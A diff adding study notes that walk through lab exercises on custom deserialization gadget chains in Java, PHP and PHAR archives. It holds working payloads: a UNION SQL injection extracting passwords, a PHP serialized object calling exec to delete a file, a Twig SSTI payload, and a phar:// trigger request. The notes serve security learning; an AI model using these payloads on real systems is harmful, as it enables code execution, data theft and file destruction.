@@ -1102,3 +1102,898 @@ Potential Remote Code Execution
     * Access to application data and secrets.
     * Further compromise of the application server.
   * The availability of a documented gadget chain significantly lowers the amount of application-specific research required to exploit an unsafe Ruby deserialization endpoint.
+
+## Developing a Custom Gadget Chain for Java Deserialization
+
+* **The Objective**
+
+  * Exploit insecure Java deserialization when a serialized Java object is accepted through a session cookie.
+  * Obtain application source code and identify a class whose deserialization behavior can be abused.
+  * Construct a custom serialized object that triggers SQL injection through the vulnerable class.
+  * Use the resulting SQL injection to extract sensitive data from the database.
+
+* **The Mechanism**
+
+  * The application stores session information as a serialized Java object.
+  * During deserialization, Java reconstructs the object and invokes its custom `readObject()` method.
+  * If `readObject()` performs a dangerous operation using attacker-controlled object properties, the serialized object can become an entry point for another vulnerability.
+  * In this case, a deserialized `ProductTemplate` object passes its `id` attribute into a SQL statement.
+
+```text
+Attacker-Controlled Cookie
+          |
+          v
+Serialized Java Object
+          |
+          v
+Java Deserialization
+          |
+          v
+ProductTemplate.readObject()
+          |
+          v
+Attacker-Controlled id
+          |
+          v
+SQL Query
+          |
+          v
+SQL Injection
+          |
+          v
+Database Data
+```
+
+* **The Session Cookie**
+
+  * The session cookie contains a Base64-encoded serialized Java object.
+  * After Base64 decoding, the underlying data follows the Java serialization format.
+
+```text
+Session Cookie
+      |
+      v
+Base64 Decode
+      |
+      v
+Java Serialized Object
+      |
+      v
+Object Deserialization
+```
+
+* **Source Code Discovery**
+
+  * When source code or backup files are accidentally exposed, inspect classes involved in serialization and deserialization.
+  * A vulnerable class may contain a custom `readObject()` method.
+  * The important question is not simply whether a class is serializable, but what happens when its fields are processed during deserialization.
+
+* **The Vulnerable Gadget**
+
+  * The `ProductTemplate` class contains an `id` attribute.
+  * Its `readObject()` method uses this value in a SQL statement.
+  * Because the value originates from the serialized object, an attacker can control the SQL input by constructing a suitable `ProductTemplate`.
+
+```text
+Serialized ProductTemplate
+          |
+          v
+id = attacker-controlled value
+          |
+          v
+readObject()
+          |
+          v
+SQL Statement
+          |
+          v
+SQL Injection
+```
+
+* **Custom Gadget Chain**
+
+  * Unlike attacks that rely on an existing third-party gadget chain, this technique builds the exploit from application-specific source code.
+  * The serialized `ProductTemplate` acts as the entry point.
+  * Its `readObject()` method becomes the execution point that passes attacker-controlled data into the SQL query.
+
+```text
+Custom Serialized Object
+          |
+          v
+ProductTemplate
+          |
+          v
+readObject()
+          |
+          v
+SQL Injection
+```
+
+* **Testing the Injection**
+
+  * A serialized `ProductTemplate` can be created with a simple apostrophe as its `id`.
+  * When the application deserializes the object, the resulting database error can confirm that the value reaches the SQL query.
+  * This establishes a chain of vulnerabilities:
+
+```text
+Java Deserialization
+        +
+Attacker-Controlled Object Field
+        +
+Unsafe SQL Construction
+        =
+SQL Injection
+```
+
+* **Payload Generation**
+
+  * A small Java program can instantiate the vulnerable class, set its `id`, serialize the object, and Base64-encode the result.
+  * A generic Java serialization program can be adapted for this purpose.
+
+```java
+ProductTemplate product = new ProductTemplate();
+product.id = "PAYLOAD-HERE";
+
+// Serialize product
+// Base64-encode serialized output
+```
+
+* The resulting Base64 value can then be supplied as the session cookie.
+
+* **Efficient Payload Modification**
+
+  * Recompiling the Java program for every SQL injection payload is inefficient.
+  * A serialized-object manipulation tool such as Hackvertor can be used to modify the serialized object's string value while automatically maintaining the required length information and Base64 encoding.
+
+```text
+Serialized Object
+      |
+      v
+Modify id
+      |
+      v
+Update String Length
+      |
+      v
+Base64 Encode
+      |
+      v
+Session Cookie
+```
+
+* **Serialized Object Structure**
+
+  * Java serialization stores metadata about object classes and fields.
+  * String values contain length information, so changing a string without updating its corresponding length can corrupt the serialized object.
+  * Automated transformation helps keep these offsets consistent.
+
+```text
+Class Metadata
+      |
+      v
+Field Definition
+      |
+      v
+String Length
+      |
+      v
+String Value
+```
+
+* **Extracting Database Information**
+
+  * Once SQL injection is confirmed, the vulnerable `id` field can be used as the SQL injection point.
+  * A `UNION`-based technique can be used to determine the structure of the query and identify useful output columns.
+  * In the lab environment, the query contains 8 columns.
+
+* **Column Identification**
+
+  * Determine which columns accept string values.
+  * Error messages can be particularly useful when the database reflects attacker-controlled input.
+  * The objective is to find a column or error condition that allows database content to become visible in the application's response.
+
+* **Database Enumeration**
+
+  * Once the query structure is understood, database metadata can be queried to identify relevant tables and columns.
+  * The target data in this lab is stored in a `users` table with a `password` column.
+
+```text
+SQL Injection
+      |
+      v
+Database Enumeration
+      |
+      v
+users table
+      |
+      v
+password column
+      |
+      v
+Administrator Password
+```
+
+* **Example Error-Based UNION Payload**
+
+  * A suitable payload can force the database to convert the extracted password to an incompatible type, causing the value to appear in the resulting error message.
+
+```sql
+' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
+```
+
+* **Attack Flow**
+
+```text
+1. Obtain a normal serialized session cookie
+          |
+          v
+2. Identify Java serialization
+          |
+          v
+3. Discover exposed application source
+          |
+          v
+4. Identify ProductTemplate
+          |
+          v
+5. Analyze readObject()
+          |
+          v
+6. Identify attacker-controlled SQL input
+          |
+          v
+7. Serialize a custom ProductTemplate
+          |
+          v
+8. Base64-encode the object
+          |
+          v
+9. Submit the malicious session cookie
+          |
+          v
+10. Confirm SQL injection
+          |
+          v
+11. Enumerate database structure
+          |
+          v
+12. Extract sensitive database data
+```
+
+* **Core Concept**
+
+  * Java deserialization does not have to lead directly to remote code execution to be dangerous.
+  * A deserialized object's methods can invoke other vulnerable application functionality.
+  * Here, the custom gadget chain connects:
+
+```text
+Untrusted Serialized Object
+          |
+          v
+ProductTemplate
+          |
+          v
+readObject()
+          |
+          v
+SQL Injection
+          |
+          v
+Sensitive Data Extraction
+```
+
+* **The Security Impact**
+
+  * Successful exploitation can allow:
+
+    * SQL injection through a serialized object.
+    * Unauthorized database queries.
+    * Extraction of credentials and other sensitive information.
+    * Account compromise when authentication data is exposed.
+    * Further privilege escalation using the obtained credentials.
+  * The key lesson is that insecure deserialization can act as a bridge into an otherwise separate vulnerability, such as SQL injection.
+
+## Developing a Custom Gadget Chain for PHP Deserialization
+
+* **The Objective**
+
+  * Exploit insecure PHP deserialization by constructing a custom gadget chain from classes already present in the application.
+  * Analyze exposed source code to understand how PHP magic methods interact during deserialization.
+  * Build a malicious serialized object that reaches a command-execution primitive.
+  * Trigger remote code execution through the application's session mechanism.
+
+* **The Mechanism**
+
+  * The application stores session data as a serialized PHP object.
+  * During deserialization, PHP may invoke magic methods such as `__wakeup()` and `__get()`.
+  * By controlling the properties of serialized objects, an attacker can cause these methods to interact in an unintended sequence.
+  * The resulting chain can eventually reach a dangerous function such as `exec()`.
+
+### Core Layout Structure
+
+```text
+Attacker-Controlled Session Cookie
+              |
+              v
+       Serialized PHP Object
+              |
+              v
+       PHP Deserialization
+              |
+              v
+       CustomTemplate
+              |
+          __wakeup()
+              |
+              v
+           Product
+              |
+              v
+        DefaultMap object
+              |
+           __get()
+              |
+              v
+       call_user_func()
+              |
+              v
+            exec()
+              |
+              v
+      Command Execution
+```
+
+* **Source Code Discovery**
+
+  * Source code disclosure can reveal the classes and methods needed to construct a custom gadget chain.
+  * Backup files created by editors may sometimes be accessible by appending `~` to the original filename.
+  * For example:
+
+```text
+/cgi-bin/libs/CustomTemplate.php
+```
+
+* A backup copy may be accessible as:
+
+```text
+/cgi-bin/libs/CustomTemplate.php~
+```
+
+* **Identifying the First Gadget: `CustomTemplate`**
+
+  * The `CustomTemplate` class contains a `__wakeup()` magic method.
+  * `__wakeup()` is automatically invoked when a serialized `CustomTemplate` object is deserialized.
+  * The method creates a new `Product` using properties from the `CustomTemplate` object.
+
+```text
+CustomTemplate
+      |
+      v
+   __wakeup()
+      |
+      v
+new Product(...)
+      |
+      +-- default_desc_type
+      |
+      +-- desc
+```
+
+* **Identifying the Second Gadget: `DefaultMap`**
+
+  * The `DefaultMap` class contains a `__get()` magic method.
+  * `__get()` is triggered when code attempts to access an inaccessible or nonexistent property.
+  * The method passes its `callback` property to `call_user_func()`.
+  * This means the callback can control which function is invoked.
+
+```text
+Missing Property Access
+          |
+          v
+      __get($name)
+          |
+          v
+   call_user_func()
+          |
+          v
+   DefaultMap->callback
+```
+
+* **Building the Gadget Chain**
+
+  * The two classes can be connected by controlling their serialized properties.
+  * Set:
+
+```text
+CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt"
+CustomTemplate->desc = DefaultMap
+DefaultMap->callback = "exec"
+```
+
+* The resulting data flow is:
+
+```text
+CustomTemplate
+      |
+      | default_desc_type
+      v
+"rm /home/carlos/morale.txt"
+
+CustomTemplate
+      |
+      | desc
+      v
+DefaultMap
+      |
+      | missing property access
+      v
+__get()
+      |
+      v
+call_user_func("exec", ...)
+      |
+      v
+exec("rm /home/carlos/morale.txt")
+```
+
+* **Why `__get()` Is Important**
+
+  * The `Product` constructor attempts to access `default_desc_type` from the object supplied through `desc`.
+  * The supplied `desc` is a `DefaultMap` object rather than a normal object containing that property.
+  * Because the requested property does not exist, PHP invokes `DefaultMap::__get()`.
+  * `__get()` then passes the attacker-controlled callback to `call_user_func()`.
+  * The callback is set to `exec`, turning the property access into a command-execution primitive.
+
+* **Serialized Malicious Object**
+
+  * The complete object can be represented as:
+
+```text
+O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
+```
+
+* The structure represents:
+
+```text
+CustomTemplate
+  |
+  +-- default_desc_type
+  |      |
+  |      +-- "rm /home/carlos/morale.txt"
+  |
+  +-- desc
+         |
+         +-- DefaultMap
+                |
+                +-- callback
+                       |
+                       +-- "exec"
+```
+
+* **Payload Encoding**
+
+  * The serialized object must be encoded in the format expected by the session mechanism.
+  * In this lab, the serialized object is:
+
+    1. Base64-encoded.
+    2. URL-encoded.
+    3. Supplied through the session cookie.
+
+```text
+Serialized PHP Object
+        |
+        v
+    Base64 Encode
+        |
+        v
+    URL Encode
+        |
+        v
+    Session Cookie
+        |
+        v
+    Application
+```
+
+* **Deserialization Flow**
+
+  * The application receives the malicious session cookie.
+  * PHP decodes and deserializes the object.
+  * `CustomTemplate::__wakeup()` executes automatically.
+  * The resulting `Product` construction accesses the controlled properties.
+  * Accessing the missing property on `DefaultMap` triggers `__get()`.
+  * `__get()` invokes the attacker-controlled `exec` callback.
+  * The supplied command is executed in the application's server context.
+
+* **Attack Flow**
+
+```text
+1. Obtain a normal session cookie
+          |
+          v
+2. Identify PHP serialization
+          |
+          v
+3. Discover exposed source code
+          |
+          v
+4. Identify CustomTemplate::__wakeup()
+          |
+          v
+5. Identify DefaultMap::__get()
+          |
+          v
+6. Identify call_user_func() as the execution sink
+          |
+          v
+7. Connect the gadgets through object properties
+          |
+          v
+8. Create the serialized object
+          |
+          v
+9. Base64 + URL encode the object
+          |
+          v
+10. Submit the forged session cookie
+          |
+          v
+11. Deserialization triggers the gadget chain
+          |
+          v
+12. Command execution
+```
+
+* **Core Concept**
+
+  * A custom PHP gadget chain does not require a pre-existing public exploit.
+  * The attacker can construct a chain from application classes by tracing how magic methods process attacker-controlled properties.
+
+```text
+Attacker-Controlled Property
+          |
+          v
+     Magic Method
+          |
+          v
+   Another Application Class
+          |
+          v
+     Magic Method
+          |
+          v
+    Dangerous Function
+```
+
+* **The Security Impact**
+
+  * Successful exploitation can provide:
+
+    * Remote code execution.
+    * Arbitrary operating-system commands.
+    * File creation, modification, or deletion.
+    * Access to application secrets and data.
+    * A path toward further server compromise.
+  * The vulnerability is especially severe when serialized session data is controlled by the client and the application contains magic methods that invoke dangerous functionality.
+
+## Using PHAR Deserialization to Deploy a Custom Gadget Chain
+
+* **The Objective**
+
+  * Exploit PHP `PHAR` metadata deserialization in an application that does not explicitly deserialize user input.
+  * Identify an existing application gadget chain from the exposed source code.
+  * Embed a malicious serialized object into a PHAR-based file.
+  * Trigger deserialization through a `phar://` stream and reach remote code execution.
+
+* **The Mechanism**
+
+  * PHAR archives can contain serialized metadata.
+  * Certain PHP filesystem operations involving a `phar://` stream can cause this metadata to be deserialized.
+  * This creates an indirect deserialization primitive even when the application does not explicitly call `unserialize()`.
+  * If the application contains suitable magic methods and dangerous data flows, the deserialized object can trigger a custom gadget chain.
+
+### Core Layout Structure
+
+```text
+Malicious PHAR/JPG
+       |
+       v
+PHAR Metadata
+       |
+       v
+Serialized PHP Objects
+       |
+       v
+phar:// Stream
+       |
+       v
+Filesystem Operation
+       |
+       v
+PHP Deserialization
+       |
+       v
+Custom Gadget Chain
+       |
+       v
+Twig SSTI
+       |
+       v
+Command Execution
+```
+
+* **The File Upload Feature**
+
+  * The application provides an avatar upload feature that accepts JPG images.
+  * The uploaded file is later referenced through an avatar endpoint.
+  * This creates an opportunity to place a malicious PHAR/JPG polyglot on the server while satisfying the application's expected image format.
+
+```text
+Avatar Upload
+     |
+     v
+JPG Validation
+     |
+     v
+Malicious PHAR/JPG Stored
+     |
+     v
+Avatar Retrieval
+```
+
+* **Source Code Discovery**
+
+  * Exposed source files can reveal the classes and methods needed to construct the gadget chain.
+  * Backup files may sometimes be accessible by appending `~` to a PHP filename.
+
+```text
+/cgi-bin/Blog.php
+        |
+        v
+/cgi-bin/Blog.php~
+
+/cgi-bin/CustomTemplate.php
+        |
+        v
+/cgi-bin/CustomTemplate.php~
+```
+
+* **Identifying the Gadget Chain**
+
+  * The relevant application classes include `Blog` and `CustomTemplate`.
+  * The important data flow involves:
+
+    * `Blog->desc`
+    * `CustomTemplate->template_file_path`
+    * `CustomTemplate->lockFilePath`
+  * The chain becomes exploitable because attacker-controlled object properties eventually reach a filesystem operation.
+
+```text
+Blog
+ |
+ +-- desc
+ |
+ v
+CustomTemplate
+ |
+ +-- template_file_path
+ |
+ v
+lockFilePath
+ |
+ v
+file_exists()
+```
+
+* **The Deserialization Trigger**
+
+  * The application does not need to explicitly call `unserialize()` for this technique to work.
+  * The critical trigger is a filesystem operation involving a `phar://` path.
+  * When PHP processes the PHAR stream, the archive metadata can be deserialized.
+
+```text
+phar://wiener
+      |
+      v
+PHAR Metadata
+      |
+      v
+Object Deserialization
+      |
+      v
+Gadget Chain
+```
+
+* **The Filesystem Sink**
+
+  * The application calls `file_exists()` using a value derived from the deserialized object.
+  * When this value references a `phar://` stream, PHP processes the PHAR archive.
+  * This provides the bridge between an apparently harmless filesystem check and PHP object deserialization.
+
+```text
+Attacker-Controlled Path
+          |
+          v
+      file_exists()
+          |
+          v
+      phar:// Stream
+          |
+          v
+   PHAR Metadata Parsing
+          |
+          v
+    Object Deserialization
+```
+
+* **Twig Server-Side Template Injection**
+
+  * The gadget chain provides control over a template-related value.
+  * Because the application uses the Twig template engine, the controlled value can contain a server-side template injection payload.
+  * A documented Twig SSTI technique can be adapted to invoke `exec()`.
+
+```text
+Controlled Template
+        |
+        v
+Twig Rendering
+        |
+        v
+SSTI
+        |
+        v
+exec()
+        |
+        v
+Command Execution
+```
+
+* **SSTI Payload**
+
+```twig
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
+```
+
+* The first expression registers `exec` as the callback for an undefined Twig filter.
+
+* The second expression requests a filter using the supplied command as its name.
+
+* This causes Twig to reach the registered callback with the attacker-controlled value.
+
+* **Constructing the Gadget Objects**
+
+  * The required object relationship can be created with PHP classes matching the application's expected structure.
+
+```php
+class CustomTemplate {}
+class Blog {}
+
+$object = new CustomTemplate;
+$blog = new Blog;
+
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
+$blog->user = 'user';
+
+$object->template_file_path = $blog;
+```
+
+* The important relationship is:
+
+```text
+CustomTemplate
+       |
+       | template_file_path
+       v
+     Blog
+       |
+       | desc
+       v
+Twig SSTI Payload
+```
+
+* **PHAR-JPG Polyglot**
+
+  * A PHAR/JPG polyglot combines a valid-looking JPG with PHAR data.
+  * This allows the file to pass an image upload check while still containing PHAR metadata.
+  * The malicious serialized objects are placed in the PHAR metadata portion of the file.
+
+```text
++-----------------------------+
+| JPG-Compatible Data         |
++-----------------------------+
+| PHAR Structure              |
++-----------------------------+
+| Serialized Object Metadata  |
++-----------------------------+
+```
+
+* **Triggering the Gadget Chain**
+
+  * After the malicious PHAR/JPG has been uploaded, the application can be directed to access it through the `phar://` stream wrapper.
+
+```http
+GET /cgi-bin/avatar.php?avatar=phar://wiener
+```
+
+* The `phar://` reference causes PHP to treat the uploaded file as a PHAR archive.
+
+* Metadata processing triggers deserialization.
+
+* The resulting objects activate the application gadget chain.
+
+* **Complete Attack Flow**
+
+```text
+1. Identify avatar upload functionality
+          |
+          v
+2. Discover exposed application source
+          |
+          v
+3. Identify Blog/CustomTemplate data flow
+          |
+          v
+4. Find file_exists() filesystem sink
+          |
+          v
+5. Identify Twig template engine
+          |
+          v
+6. Create Twig SSTI payload
+          |
+          v
+7. Construct malicious PHP objects
+          |
+          v
+8. Serialize objects into PHAR metadata
+          |
+          v
+9. Create PHAR/JPG polyglot
+          |
+          v
+10. Upload the malicious image
+          |
+          v
+11. Reference it using phar://
+          |
+          v
+12. PHAR metadata is deserialized
+          |
+          v
+13. Custom gadget chain executes
+          |
+          v
+14. Twig SSTI reaches command execution
+```
+
+* **Core Concept**
+
+  * PHAR deserialization demonstrates that unsafe deserialization does not always require a direct call to `unserialize()`.
+  * A filesystem operation can become the deserialization trigger when it processes a `phar://` resource containing serialized metadata.
+  * The overall chain combines several application behaviors:
+
+```text
+PHAR Metadata
+      +
+Filesystem Operation
+      +
+PHP Object Deserialization
+      +
+Custom Gadget Chain
+      +
+Twig SSTI
+      =
+Remote Code Execution
+```
+
+* **The Security Impact**
+
+  * Successful exploitation can provide:
+
+    * PHP object deserialization through an indirect filesystem operation.
+    * Execution of application-defined gadget chains.
+    * Server-side template injection.
+    * Remote command execution.
+    * Arbitrary file modification or deletion.
+    * Potential access to application secrets and other server-side resources.
+  * The key lesson is that seemingly non-deserialization features, such as file uploads and filesystem checks, can become dangerous when combined with PHAR stream handling and exploitable application classes.
